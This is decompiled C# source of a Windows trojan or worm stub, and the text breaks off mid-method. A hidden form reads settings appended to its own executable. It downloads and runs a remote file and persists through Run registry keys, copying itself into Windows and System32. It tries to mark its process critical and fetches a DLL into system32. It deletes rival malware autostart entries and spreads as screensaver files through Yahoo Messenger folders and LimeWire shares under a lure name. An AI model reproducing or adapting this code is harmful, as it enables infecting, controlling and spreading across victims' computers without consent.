using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using datav.My;

namespace datav;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("TextBox6")]
	private TextBox _TextBox6;

	[AccessedThroughProperty("TextBox5")]
	private TextBox _TextBox5;

	[AccessedThroughProperty("TextBox7")]
	private TextBox _TextBox7;

	[AccessedThroughProperty("TextBox8")]
	private TextBox _TextBox8;

	[AccessedThroughProperty("TextBox9")]
	private TextBox _TextBox9;

	[AccessedThroughProperty("TextBox10")]
	private TextBox _TextBox10;

	[AccessedThroughProperty("TextBox11")]
	private TextBox _TextBox11;

	[AccessedThroughProperty("TextBox12")]
	private TextBox _TextBox12;

	[AccessedThroughProperty("TextBox13")]
	private TextBox _TextBox13;

	[AccessedThroughProperty("TextBox14")]
	private TextBox _TextBox14;

	[AccessedThroughProperty("TextBox15")]
	private TextBox _TextBox15;

	[AccessedThroughProperty("TextBox16")]
	private TextBox _TextBox16;

	[AccessedThroughProperty("TextBox17")]
	private TextBox _TextBox17;

	[AccessedThroughProperty("TextBox18")]
	private TextBox _TextBox18;

	[AccessedThroughProperty("TextBox19")]
	private TextBox _TextBox19;

	[AccessedThroughProperty("TextBox20")]
	private TextBox _TextBox20;

	[AccessedThroughProperty("TextBox21")]
	private TextBox _TextBox21;

	[AccessedThroughProperty("TextBox22")]
	private TextBox _TextBox22;

	[AccessedThroughProperty("TextBox23")]
	private TextBox _TextBox23;

	[AccessedThroughProperty("TextBox24")]
	private TextBox _TextBox24;

	[AccessedThroughProperty("TextBox25")]
	private TextBox _TextBox25;

	[AccessedThroughProperty("TextBox26")]
	private TextBox _TextBox26;

	private string statuscritique;

	private string botkill;

	private string libri;

	private string downlibri;

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Timer1 = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual TextBox TextBox6
	{
		get
		{
			return _TextBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox6 = value;
		}
	}

	internal virtual TextBox TextBox5
	{
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox5 = value;
		}
	}

	internal virtual TextBox TextBox7
	{
		get
		{
			return _TextBox7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox7 = value;
		}
	}

	internal virtual TextBox TextBox8
	{
		get
		{
			return _TextBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox8 = value;
		}
	}

	internal virtual TextBox TextBox9
	{
		get
		{
			return _TextBox9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox9 = value;
		}
	}

	internal virtual TextBox TextBox10
	{
		get
		{
			return _TextBox10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox10 = value;
		}
	}

	internal virtual TextBox TextBox11
	{
		get
		{
			return _TextBox11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox11 = value;
		}
	}

	internal virtual TextBox TextBox12
	{
		get
		{
			return _TextBox12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox12 = value;
		}
	}

	internal virtual TextBox TextBox13
	{
		get
		{
			return _TextBox13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox13 = value;
		}
	}

	internal virtual TextBox TextBox14
	{
		get
		{
			return _TextBox14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox14 = value;
		}
	}

	internal virtual TextBox TextBox15
	{
		get
		{
			return _TextBox15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox15 = value;
		}
	}

	internal virtual TextBox TextBox16
	{
		get
		{
			return _TextBox16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox16 = value;
		}
	}

	internal virtual TextBox TextBox17
	{
		get
		{
			return _TextBox17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox17 = value;
		}
	}

	internal virtual TextBox TextBox18
	{
		get
		{
			return _TextBox18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox18 = value;
		}
	}

	internal virtual TextBox TextBox19
	{
		get
		{
			return _TextBox19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox19 = value;
		}
	}

	internal virtual TextBox TextBox20
	{
		get
		{
			return _TextBox20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox20 = value;
		}
	}

	internal virtual TextBox TextBox21
	{
		get
		{
			return _TextBox21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox21 = value;
		}
	}

	internal virtual TextBox TextBox22
	{
		get
		{
			return _TextBox22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox22 = value;
		}
	}

	internal virtual TextBox TextBox23
	{
		get
		{
			return _TextBox23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox23 = value;
		}
	}

	internal virtual TextBox TextBox24
	{
		get
		{
			return _TextBox24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox24 = value;
		}
	}

	internal virtual TextBox TextBox25
	{
		get
		{
			return _TextBox25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox25 = value;
		}
	}

	internal virtual TextBox TextBox26
	{
		get
		{
			return _TextBox26;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox26 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		Timer1 = new Timer(components);
		TextBox4 = new TextBox();
		TextBox6 = new TextBox();
		TextBox5 = new TextBox();
		TextBox7 = new TextBox();
		TextBox8 = new TextBox();
		TextBox9 = new TextBox();
		TextBox10 = new TextBox();
		TextBox11 = new TextBox();
		TextBox12 = new TextBox();
		TextBox13 = new TextBox();
		TextBox14 = new TextBox();
		TextBox15 = new TextBox();
		TextBox16 = new TextBox();
		TextBox17 = new TextBox();
		TextBox18 = new TextBox();
		TextBox19 = new TextBox();
		TextBox20 = new TextBox();
		TextBox21 = new TextBox();
		TextBox22 = new TextBox();
		TextBox23 = new TextBox();
		TextBox24 = new TextBox();
		TextBox25 = new TextBox();
		TextBox26 = new TextBox();
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(12, 2);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox textBox3 = TextBox2;
		location = new Point(12, 41);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(100, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		TextBox textBox5 = TextBox3;
		location = new Point(12, 80);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(100, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(2);
		TextBox textBox7 = TextBox4;
		location = new Point(100, 106);
		((Control)textBox7).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox8 = TextBox4;
		size = new Size(100, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox4).set_TabIndex(3);
		TextBox textBox9 = TextBox6;
		location = new Point(131, 80);
		((Control)textBox9).set_Location(location);
		((Control)TextBox6).set_Name("TextBox6");
		TextBox textBox10 = TextBox6;
		size = new Size(100, 20);
		((Control)textBox10).set_Size(size);
		((Control)TextBox6).set_TabIndex(4);
		TextBox textBox11 = TextBox5;
		location = new Point(-30, 106);
		((Control)textBox11).set_Location(location);
		((Control)TextBox5).set_Name("TextBox5");
		TextBox textBox12 = TextBox5;
		size = new Size(100, 20);
		((Control)textBox12).set_Size(size);
		((Control)TextBox5).set_TabIndex(5);
		TextBox textBox13 = TextBox7;
		location = new Point(106, 160);
		((Control)textBox13).set_Location(location);
		((Control)TextBox7).set_Name("TextBox7");
		TextBox textBox14 = TextBox7;
		size = new Size(100, 20);
		((Control)textBox14).set_Size(size);
		((Control)TextBox7).set_TabIndex(6);
		TextBox textBox15 = TextBox8;
		location = new Point(0, 149);
		((Control)textBox15).set_Location(location);
		((Control)TextBox8).set_Name("TextBox8");
		TextBox textBox16 = TextBox8;
		size = new Size(100, 20);
		((Control)textBox16).set_Size(size);
		((Control)TextBox8).set_TabIndex(7);
		TextBox textBox17 = TextBox9;
		location = new Point(106, 12);
		((Control)textBox17).set_Location(location);
		((Control)TextBox9).set_Name("TextBox9");
		TextBox textBox18 = TextBox9;
		size = new Size(100, 20);
		((Control)textBox18).set_Size(size);
		((Control)TextBox9).set_TabIndex(8);
		TextBox textBox19 = TextBox10;
		location = new Point(85, 54);
		((Control)textBox19).set_Location(location);
		((Control)TextBox10).set_Name("TextBox10");
		TextBox textBox20 = TextBox10;
		size = new Size(100, 20);
		((Control)textBox20).set_Size(size);
		((Control)TextBox10).set_TabIndex(9);
		TextBox textBox21 = TextBox11;
		location = new Point(76, 121);
		((Control)textBox21).set_Location(location);
		((Control)TextBox11).set_Name("TextBox11");
		TextBox textBox22 = TextBox11;
		size = new Size(100, 20);
		((Control)textBox22).set_Size(size);
		((Control)TextBox11).set_TabIndex(10);
		TextBox textBox23 = TextBox12;
		location = new Point(0, 0);
		((Control)textBox23).set_Location(location);
		((Control)TextBox12).set_Name("TextBox12");
		TextBox textBox24 = TextBox12;
		size = new Size(100, 20);
		((Control)textBox24).set_Size(size);
		((Control)TextBox12).set_TabIndex(11);
		TextBox textBox25 = TextBox13;
		location = new Point(85, 38);
		((Control)textBox25).set_Location(location);
		((Control)TextBox13).set_Name("TextBox13");
		TextBox textBox26 = TextBox13;
		size = new Size(100, 20);
		((Control)textBox26).set_Size(size);
		((Control)TextBox13).set_TabIndex(12);
		TextBox textBox27 = TextBox14;
		location = new Point(0, 0);
		((Control)textBox27).set_Location(location);
		((Control)TextBox14).set_Name("TextBox14");
		TextBox textBox28 = TextBox14;
		size = new Size(100, 20);
		((Control)textBox28).set_Size(size);
		((Control)TextBox14).set_TabIndex(13);
		TextBox textBox29 = TextBox15;
		location = new Point(25, 80);
		((Control)textBox29).set_Location(location);
		((Control)TextBox15).set_Name("TextBox15");
		TextBox textBox30 = TextBox15;
		size = new Size(100, 20);
		((Control)textBox30).set_Size(size);
		((Control)TextBox15).set_TabIndex(14);
		TextBox textBox31 = TextBox16;
		location = new Point(0, 0);
		((Control)textBox31).set_Location(location);
		((Control)TextBox16).set_Name("TextBox16");
		TextBox textBox32 = TextBox16;
		size = new Size(100, 20);
		((Control)textBox32).set_Size(size);
		((Control)TextBox16).set_TabIndex(15);
		TextBox textBox33 = TextBox17;
		location = new Point(8, 8);
		((Control)textBox33).set_Location(location);
		((Control)TextBox17).set_Name("TextBox17");
		TextBox textBox34 = TextBox17;
		size = new Size(100, 20);
		((Control)textBox34).set_Size(size);
		((Control)TextBox17).set_TabIndex(16);
		TextBox textBox35 = TextBox18;
		location = new Point(16, 16);
		((Control)textBox35).set_Location(location);
		((Control)TextBox18).set_Name("TextBox18");
		TextBox textBox36 = TextBox18;
		size = new Size(100, 20);
		((Control)textBox36).set_Size(size);
		((Control)TextBox18).set_TabIndex(17);
		TextBox textBox37 = TextBox19;
		location = new Point(0, 0);
		((Control)textBox37).set_Location(location);
		((Control)TextBox19).set_Name("TextBox19");
		TextBox textBox38 = TextBox19;
		size = new Size(100, 20);
		((Control)textBox38).set_Size(size);
		((Control)TextBox19).set_TabIndex(18);
		TextBox textBox39 = TextBox20;
		location = new Point(0, 0);
		((Control)textBox39).set_Location(location);
		((Control)TextBox20).set_Name("TextBox20");
		TextBox textBox40 = TextBox20;
		size = new Size(100, 20);
		((Control)textBox40).set_Size(size);
		((Control)TextBox20).set_TabIndex(19);
		TextBox textBox41 = TextBox21;
		location = new Point(8, 8);
		((Control)textBox41).set_Location(location);
		((Control)TextBox21).set_Name("TextBox21");
		TextBox textBox42 = TextBox21;
		size = new Size(100, 20);
		((Control)textBox42).set_Size(size);
		((Control)TextBox21).set_TabIndex(20);
		TextBox textBox43 = TextBox22;
		location = new Point(0, 0);
		((Control)textBox43).set_Location(location);
		((Control)TextBox22).set_Name("TextBox22");
		TextBox textBox44 = TextBox22;
		size = new Size(100, 20);
		((Control)textBox44).set_Size(size);
		((Control)TextBox22).set_TabIndex(21);
		TextBox textBox45 = TextBox23;
		location = new Point(0, 0);
		((Control)textBox45).set_Location(location);
		((Control)TextBox23).set_Name("TextBox23");
		TextBox textBox46 = TextBox23;
		size = new Size(100, 20);
		((Control)textBox46).set_Size(size);
		((Control)TextBox23).set_TabIndex(22);
		TextBox textBox47 = TextBox24;
		location = new Point(0, 0);
		((Control)textBox47).set_Location(location);
		((Control)TextBox24).set_Name("TextBox24");
		TextBox textBox48 = TextBox24;
		size = new Size(100, 20);
		((Control)textBox48).set_Size(size);
		((Control)TextBox24).set_TabIndex(23);
		TextBox textBox49 = TextBox25;
		location = new Point(0, 0);
		((Control)textBox49).set_Location(location);
		((Control)TextBox25).set_Name("TextBox25");
		TextBox textBox50 = TextBox25;
		size = new Size(100, 20);
		((Control)textBox50).set_Size(size);
		((Control)TextBox25).set_TabIndex(24);
		TextBox textBox51 = TextBox26;
		location = new Point(0, 0);
		((Control)textBox51).set_Location(location);
		((Control)TextBox26).set_Name("TextBox26");
		TextBox textBox52 = TextBox26;
		size = new Size(100, 20);
		((Control)textBox52).set_Size(size);
		((Control)TextBox26).set_TabIndex(25);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(104, 87);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox26);
		((Control)this).get_Controls().Add((Control)(object)TextBox25);
		((Control)this).get_Controls().Add((Control)(object)TextBox24);
		((Control)this).get_Controls().Add((Control)(object)TextBox23);
		((Control)this).get_Controls().Add((Control)(object)TextBox22);
		((Control)this).get_Controls().Add((Control)(object)TextBox21);
		((Control)this).get_Controls().Add((Control)(object)TextBox20);
		((Control)this).get_Controls().Add((Control)(object)TextBox19);
		((Control)this).get_Controls().Add((Control)(object)TextBox18);
		((Control)this).get_Controls().Add((Control)(object)TextBox17);
		((Control)this).get_Controls().Add((Control)(object)TextBox16);
		((Control)this).get_Controls().Add((Control)(object)TextBox15);
		((Control)this).get_Controls().Add((Control)(object)TextBox14);
		((Control)this).get_Controls().Add((Control)(object)TextBox13);
		((Control)this).get_Controls().Add((Control)(object)TextBox12);
		((Control)this).get_Controls().Add((Control)(object)TextBox11);
		((Control)this).get_Controls().Add((Control)(object)TextBox10);
		((Control)this).get_Controls().Add((Control)(object)TextBox9);
		((Control)this).get_Controls().Add((Control)(object)TextBox8);
		((Control)this).get_Controls().Add((Control)(object)TextBox7);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private static int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength)
	{
		return 0;
	}

	public void LOL()
	{
		try
		{
			string text = File.ReadAllText(Application.get_ExecutablePath());
			if (text.Contains("FileSplit"))
			{
				string[] array = Strings.Split(text, "FileSplit", -1, (CompareMethod)0);
				int num = Information.UBound((Array)array, 1);
				for (int i = 1; i <= num; i = checked(i + 1))
				{
					TextBox1.set_Text(array[1]);
					TextBox2.set_Text(array[2]);
					TextBox3.set_Text(array[3]);
					TextBox6.set_Text(array[4]);
					TextBox5.set_Text(array[5]);
					TextBox7.set_Text(array[6]);
					TextBox8.set_Text(array[7]);
					TextBox9.set_Text(array[8]);
					TextBox12.set_Text(array[9]);
					TextBox13.set_Text(array[10]);
					TextBox14.set_Text(array[11]);
					TextBox15.set_Text(array[12]);
					TextBox16.set_Text(array[13]);
					TextBox17.set_Text(array[14]);
					TextBox18.set_Text(array[15]);
					TextBox19.set_Text(array[16]);
					TextBox20.set_Text(array[17]);
					TextBox21.set_Text(array[18]);
					TextBox22.set_Text(array[19]);
					TextBox23.set_Text(array[20]);
					TextBox24.set_Text(array[21]);
					TextBox25.set_Text(array[22]);
					TextBox26.set_Text(array[23]);
					statuscritique = array[24];
					botkill = array[25];
					libri = array[26];
					downlibri = array[27];
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void pizaa()
	{
		if (File.Exists(TextBox2.get_Text() + TextBox3.get_Text()))
		{
			File.Delete(TextBox2.get_Text() + TextBox3.get_Text());
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(TextBox1.get_Text(), TextBox2.get_Text() + TextBox3.get_Text());
			Process.Start(TextBox2.get_Text() + TextBox3.get_Text());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Installs()
	{
		if (Operators.CompareString(TextBox6.get_Text(), "1", false) == 0)
		{
			File.Copy(Application.get_ExecutablePath(), "C:\\Windows\\Temp\\" + TextBox5.get_Text() + ".exe");
			try
			{
				RegistryKey registryKey = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
				RegistryKey registryKey2 = registryKey;
				registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey2.SetValue(TextBox5.get_Text(), "C:\\Windows\\Temp\\" + TextBox5.get_Text() + ".exe");
				registryKey2 = null;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(TextBox7.get_Text(), "1", false) == 0)
		{
			File.Copy(Application.get_ExecutablePath(), "C:\\Windows\\" + TextBox5.get_Text() + ".exe");
			try
			{
				RegistryKey registryKey3 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
				RegistryKey registryKey4 = registryKey3;
				registryKey4.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey4.SetValue(TextBox5.get_Text(), "C:\\Windows\\" + TextBox5.get_Text() + ".exe");
				registryKey4 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(TextBox8.get_Text(), "1", false) == 0)
		{
			File.Copy(Application.get_ExecutablePath(), "C:\\Windows\\System32\\" + TextBox5.get_Text() + ".exe");
			try
			{
				RegistryKey registryKey5 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
				RegistryKey registryKey6 = registryKey5;
				registryKey6.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey6.SetValue(TextBox5.get_Text(), "C:\\Windows\\System32\\" + TextBox5.get_Text() + ".exe");
				registryKey6 = null;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void critiqueprocess()
	{
		if (Operators.CompareString(statuscritique, "1", false) == 0)
		{
			Process.EnterDebugMode();
			IntPtr handle = Process.GetCurrentProcess().Handle;
			int processInformation = 1;
			NtSetInformationProcess(handle, 29, ref processInformation, 4);
		}
	}

	public void dlllibrairy()
	{
		if (Operators.CompareString(libri, "1", false) == 0)
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(downlibri, "C:\\WINDOWS\\system32\\Mozsqlite3.dll");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			LOL();
			botkills();
			pizaa();
			EmailN();
			Installs();
			critiqueprocess();
			botkills();
			persit();
			CacherFichier();
			USB();
			LAN();
			MSkypeS();
			Yahoo();
			P2P();
			MSN();
			FBWall(TextBox15.get_Text());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void botkillv()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey.DeleteValue("Windows Update");
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey2.DeleteValue("Winupdate");
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey3.DeleteValue("svchost");
		RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey4.DeleteValue("javaw");
		RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey5.DeleteValue("Audio");
		RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey6.DeleteValue("DarkCometRAT");
		RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey7.DeleteValue("msnmsgsr");
		RegistryKey registryKey8 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey8.DeleteValue("DanyHost");
		RegistryKey registryKey9 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey9.DeleteValue("Updater");
		RegistryKey registryKey10 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey10.DeleteValue("winlogon");
		RegistryKey registryKey11 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		registryKey11.DeleteValue("winupdater");
		RegistryKey registryKey12 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		registryKey12.DeleteValue("explorer");
	}

	public void botkills()
	{
		if (Operators.CompareString(botkill, "1", false) == 0)
		{
			botkillv();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Yahoo()
	{
		if (Operators.CompareString(TextBox26.get_Text(), "1", false) != 0)
		{
			return;
		}
		try
		{
			_ = Assembly.GetExecutingAssembly().GetModules()[0];
			string executablePath = Application.get_ExecutablePath();
			string text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
			if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
			{
				return;
			}
			int num = 0;
			string[] directories = Directory.GetDirectories(text);
			int upperBound = directories.GetUpperBound(0);
			for (num = 0; num <= upperBound; num = checked(num + 1))
			{
				if (Operators.CompareString(FileSystem.Dir(directories[num], (FileAttribute)16), "", false) != 0 && !File.Exists(directories[num] + "\\ys.scr"))
				{
					File.Copy(executablePath, directories[num] + "\\ys.scr");
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void P2P()
	{
		if (Operators.CompareString(TextBox17.get_Text(), "1", false) == 0)
		{
			try
			{
				string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object)0));
				string text2 = "porno-movie.scr";
				File.Copy(Application.get_ExecutablePath(), text + text2);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string text3 = "porno-movie.scr";
				File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programfiles\\Shared\\" + text3));
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void EmailN()
	{
		try
		{
			if (Operators.CompareString(TextBox22.get_Text(), "0", false) == 0)
			{
			}
			if (File.Exists("C:\\WINDOWS\\Temp\\internet.txt"))
			{
